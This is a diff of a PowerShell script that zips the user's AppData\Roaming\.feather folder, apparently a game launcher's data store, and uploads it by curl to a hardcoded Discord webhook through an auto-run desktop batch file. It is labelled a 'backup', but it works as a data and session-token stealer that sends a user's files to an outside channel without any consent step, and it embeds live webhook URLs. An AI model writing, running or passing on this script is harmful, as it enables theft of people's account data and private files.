@@ -1,53 +1,55 @@
-# Define paths
+# Set paths
 $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
-$featherPath = Join-Path $env:USERPROFILE 'AppData\Roaming\.feather'
+$batchFilePath = Join-Path $desktopPath 'send_feather_webhook.bat'
+$featherPath = 'C:\Users\haboom\AppData\Roaming\.feather'
 $zipPath = Join-Path $env:TEMP 'feather_backup.zip'
+$webhookUrl = 'https://discord.com/api/webhooks/1385974639590637598/I-qq5IcfJUmAbaLuA1T7hK7UM-HaQBou94NVNO7EAzuI6y1coIjL6-lm7a92wyN608Ui'
 
 # Check if the .feather folder exists
 if (-not (Test-Path $featherPath)) {
-    Write-Host ".feather folder not found at $featherPath"
+    Write-Host "ERROR: .feather folder not found at $featherPath"
     exit
 }
 
 # Remove old zip if it exists
 if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
 
-# Zip the entire .feather folder
+# Zip the .feather folder
 Compress-Archive -Path $featherPath -DestinationPath $zipPath -Force
 
-# Create batch file to send the zip via webhook
+# Create batch file content to send the zip via curl
 $batchContent = @"
 @echo off
 setlocal
 
 :: Discord Webhook URL
-set webhookUrl=https://discord.com/api/webhooks/1385974642140905623/zzWiMe-iYr68M5_0ormBmrSzLWW1VB4ZM2ROIJpxuU9vFocKTjMXx84Gn-7utigslAOH
+set webhookUrl=$webhookUrl
+
 :: Path to ZIP file
 set zipPath=$zipPath
 
-:: Payload content
-set payload_json={\"content\":\".feather folder backup attached :package:\"}
+:: JSON payload message
+set payload_json={{\"content\":\"📦 Here is the .feather folder backup.\"}}
 
 :: Send with curl
 curl -X POST %webhookUrl% ^
      -H "Content-Type: multipart/form-data" ^
      -F "payload_json=%payload_json%" ^
-     -F "file=@%zipPath%"
+     -F "file=@%zipPath%" 
 
 if %errorlevel% neq 0 (
-    echo Failed to send webhook.
+    echo ❌ Failed to send webhook.
 ) else (
-    echo ZIP sent successfully!
+    echo ✅ ZIP sent successfully!
 )
 
 endlocal
 "@
 
-# Write the batch file
+# Write the batch file to desktop
 Set-Content -Path $batchFilePath -Value $batchContent
 
-# Confirm and run
-Write-Host "Batch file created at $batchFilePath"
+# Notify and run the batch file
+Write-Host "✅ Batch file created at: $batchFilePath"
 Start-Process -FilePath $batchFilePath
-Write-Host "Batch file is now running..."
+Write-Host "🚀 Batch file is running..."
